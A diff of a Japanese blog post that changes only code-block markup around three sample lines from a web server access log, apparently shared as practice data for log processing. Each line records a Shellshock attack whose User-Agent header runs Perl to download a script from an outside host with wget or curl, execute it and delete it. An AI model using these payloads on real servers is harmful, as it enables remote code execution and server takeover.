@@ -14,12 +14,12 @@ Copyright: (C) 2017 Ryuichi Ueda
 
 これが中身です。どんな問題が出るか予想しながらいじってみていただければと。
 
-[bash]
+```bash
 uedambp:tmp ueda$ gzcat access.log.shellshock.gz | tail -n 3
 192.168.193.42 - - [12/Dec/2014:19:23:59 +0900] &quot;GET /phppath/cgi_wrapper HTTP/1.1&quot; 302 227 &quot;-&quot; &quot;() { :;};/usr/bin/perl -e 'print \\&quot;Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\&quot;;system(\\&quot;wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*\\&quot;);'&quot;
 192.168.193.42 - - [12/Dec/2014:19:23:59 +0900] &quot;GET /phppath/php HTTP/1.1&quot; 302 219 &quot;-&quot; &quot;() { :;};/usr/bin/perl -e 'print \\&quot;Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\&quot;;system(\\&quot;wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*\\&quot;);'&quot;
 192.168.225.64 - - [15/Dec/2014:03:12:20 +0900] &quot;GET /phppath/cgi_wrapper HTTP/1.1&quot; 302 227 &quot;-&quot; &quot;() { :;};/usr/bin/perl -e 'print \\&quot;Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\&quot;;system(\\&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*\\&quot;);'&quot;
-[/bash]
+```
 
 
 ヤバイ・・・
